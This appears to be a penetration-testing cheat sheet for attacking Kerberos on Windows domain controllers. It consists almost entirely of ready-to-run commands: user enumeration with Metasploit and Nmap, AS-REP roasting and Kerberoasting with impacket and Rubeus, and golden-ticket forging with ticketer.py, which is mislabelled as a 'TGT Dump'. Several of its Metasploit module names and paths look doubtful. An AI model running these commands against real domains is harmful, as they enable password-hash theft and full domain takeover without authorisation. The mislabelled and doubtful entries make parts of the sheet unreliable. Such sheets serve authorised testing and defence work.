# Kerberos
- Probably a Windows Domain Controller

## Enumeration

### Metasploit

##### kerberos_enumusers
```bash
use auxiliary/gather/kerberos_enumusers
set RHOSTS [IP]
set REALM [REALM]
set USER_FILE [file_with_usernames.txt]
run
```

##### kerberos_checksum
```bash
use auxiliary/admin/kerberos/kerberos_checksum
set RHOSTS [IP]
set REALM [REALM]
run
```

##### krb5_asrep
```bash
use auxiliary/scanner/kerberos/kerberos_asrep
set RHOSTS [IP]
set USER_FILE [file_with_usernames.txt]
set REALM [REALM]
run
```

##### krb5_tgs
```bash
use auxiliary/scanner/kerberos/kerberos_tgs
set RHOSTS [IP]
set REALM [REALM]
set USERNAME [valid_user]
run
```

### Nmap

##### Kerberos scripts
```bash
nmap -p 88 --script=krb5-enum-users --script-args krb5-enum-users.realm='[REALM]' [IP]
```

##### Service detection
```bash
nmap -sV -p 88 [IP]
```

## Exploitation

### Metasploit

##### kerberos_analyze_encrypted_timestamp
```bash
use auxiliary/analyze/kerberos/kerberos_analyze_encrypted_timestamp
set RHOST [IP]
set PCAPFILE [kerberos_traffic.pcap]
run
```

##### kerberos_ticket_clone
```bash
use auxiliary/admin/kerberos/kerberos_ticket_clone
set RHOST [IP]
set REALM [REALM]
set TGTFILE [ticket_file.kirbi]
run
```

### impacket

##### GetNPUsers.py (AS-REP Roasting)
```bash
GetNPUsers.py [REALM]/ -no-pass -usersfile [userlist.txt] -dc-ip [IP]
```

##### GetUserSPNs.py (Kerberoasting)
```bash
GetUserSPNs.py [REALM]/[user]:[password] -dc-ip [IP] -request
```

##### TGT Dump (Golden Ticket prep)
```bash
ticketer.py -nthash [NTLM_hash] -domain-sid [SID] -domain [REALM] -user-id [500] [username]
```

### Rubeus (Windows)

##### Kerberoasting with Rubeus
```powershell
Rubeus.exe kerberoast
```

##### AS-REP Roasting with Rubeus
```powershell
Rubeus.exe asreproast
```
